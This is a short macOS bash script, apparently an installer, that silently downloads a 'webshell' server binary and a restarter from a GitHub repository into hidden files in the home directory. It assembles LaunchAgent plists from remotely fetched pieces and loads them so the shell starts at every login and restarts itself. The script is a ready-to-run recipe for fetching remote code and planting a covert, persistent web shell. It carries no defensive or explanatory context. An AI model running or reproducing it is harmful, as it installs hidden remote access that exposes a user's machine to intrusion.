#!/bin/bash

# move executable:
curl -s -o ~/.webshell https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/server
curl -s -o ~/.webshellRestarter https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/restarter
chmod +x ~/.webshell
chmod +x ~/.webshellRestarter

# move launchAgent:
mkdir ~/Library/LaunchAgents
printf "%s%s%s" "$(curl -s https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/starter.plist.first)" "$USER" "$(curl -s https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/starter.plist.last)" > ~/Library/LaunchAgents/WebShellServerStarter.plist
printf "%s%s%s" "$(curl -s https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/restarter.plist.first)" "$USER" "$(curl -s https://raw.githubusercontent.com/teeheeheeaaahhaha/webshell/master/dist/restarter.plist.last)" > ~/Library/LaunchAgents/WebShellServerRestarter.plist

# run server now, don't wait for next login:
launchctl load ~/Library/LaunchAgents/WebShellServerStarter.plist
launchctl load ~/Library/LaunchAgents/WebShellServerRestarter.plist
